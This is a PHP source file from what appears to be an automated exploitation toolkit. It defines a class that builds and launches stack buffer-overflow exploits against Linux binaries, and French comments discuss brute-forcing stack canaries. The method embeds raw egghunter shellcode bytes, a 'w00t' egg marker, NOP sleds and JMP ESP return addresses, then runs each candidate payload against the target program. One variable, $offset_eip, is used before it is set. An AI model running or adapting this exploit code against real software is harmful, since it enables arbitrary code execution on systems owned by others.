<?php

class ret2canary4linux extends bin4linux{

	/*
	 gdb -q --pid=`pidof app_path`
	 gdb attach 23744
	 set follow-fork child
	 c
	 python exploit.py
	 */
	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
		$name = __CLASS__;
		$rep_path = "$this->dir_tmp/$name";
		if (!file_exists($rep_path)) $this->create_folder($rep_path);
	}

	
/*
Pour des systèmes 32 bits, le canari a une taille de 4 octets, tandis que pour les systèmes 64 bits, le canari a une taille de 8 octets. Cela signifie que pour un système 32 bits, il faut un maximum de 4*256 = 1024 tentatives pour trouver le canari, et 2048 tentatives pour un système 64 bits. 
Et ça, c’est très faisable ! 
 */
	
/*
 * 

readelf -s server | grep chk_fail


readelf -l server | grep -i RELRO
GNU_RELRO      0x0000000000001df8 0x0000000000601df8 0x0000000000601df8
 */

	
	
	
	
	
	
	
	public function ret2canary4linux4jmp2esp4sc_before_egghunter($offset_ssp, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	
		$nop = "\\x90";
		$this->file_name = trim(basename($this->file_path));
	
		$this->chapitre("STACK LINUX JMP ESP SHELLCODE EGGHUNTER BEFORE EIP ");
		$header_shellcode = '\x31\xc0\xb4\x10\x29\xc4\x90';
		$this->hex2asm($header_shellcode);
		$shellcode = $header_shellcode . $shellcode;
	
		$this->article("template", "python -c 'print \"ANYTHING\"*(\"(Offset SSP=$offset_ssp)-len(\"EGG\")-len(\"SHELLCODE\"))+\"EGG\"+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"EGG HUNTER\")-8)+\"EGG HUNTER\"'");
		$this->ssTitre("EGG HUNTER SIZE");
		// egghunter marker w00t
		$egghunter = '\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7';
		// $egghunter = '\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x77\x30\x30\x74\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7';
		// $egghunter = '\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7';
		$egghunter_size = $this->hex2size($egghunter);
		$egg = '\x77\x30\x30\x74\x77\x30\x30\x74'; // w00tw00t - \x77\x30\x30\x74\x77\x30\x30\x74
		$egg_size = $this->hex2size($egg);
		$nop = "\\x90";
	
		$this->ssTitre("SHELLCODE SIZE");$size_shellcode = $this->hex2size($shellcode);
		$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
		$nop_repeat = $exploit_size_max - $offset_eip - 4 - $egghunter_size - $footer_size;
		$header1 = "\"$header\"+\"\\x41\"*($offset_eip-$header_size-$egg_size-$size_shellcode)+\"$egg\"+\"$shellcode\"";
		$footer1 = "\"$nop\"*$nop_repeat+\"$egghunter\"+\"$footer\"";
		$tab_esp = array();
		$reg = "esp";
		$tab_esp = $this->elf2reg4jmp("esp",$dll);
		// pause();
		$i = 1;
		$total_esp = count($tab_esp);
		foreach($tab_esp as $addr_jmp_esp_sc_before_egghunter) {
			$addr_jmp_esp_sc_before_egghunter = trim($addr_jmp_esp_sc_before_egghunter);
			if(! empty($addr_jmp_esp_sc_before_egghunter)) {
				$this->article("$i/$total_esp - JMP ESP", $addr_jmp_esp_sc_before_egghunter);
				$jmp_esp_sc_before_egghunter = $this->hex2rev_32($addr_jmp_esp_sc_before_egghunter);
				$payload = "$header1+\"$jmp_esp_sc_before_egghunter\"+$footer1";
				// $payload = addcslashes($payload,'\\$');
				$query_jmp_esp_sc_before_egghunter = "python -c 'print $payload' | tee $this->file_path" . "_jmp_esp_sc_before_egghunter_" . "$addr_jmp_esp_sc_before_egghunter";
				// requette($query_jmp_esp_sc_before_egghunter);
				$cmd = "python -c 'print $payload'";
				$query = "$this->file_path `$cmd`";
				$this->article("template", "python -c 'print \"ANYTHING\"*(\"(Offset SSP=$offset_ssp)-len(\"EGG\")-len(\"SHELLCODE\"))+\"EGG\"+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"EGG HUNTER\")-8)+\"EGG HUNTER\"'");
	
				$this->requette($query);
	
				//$this->elf2debug4payload($cmd);
			}
			$i ++;
			// pause();
		}
	}
	
}

?>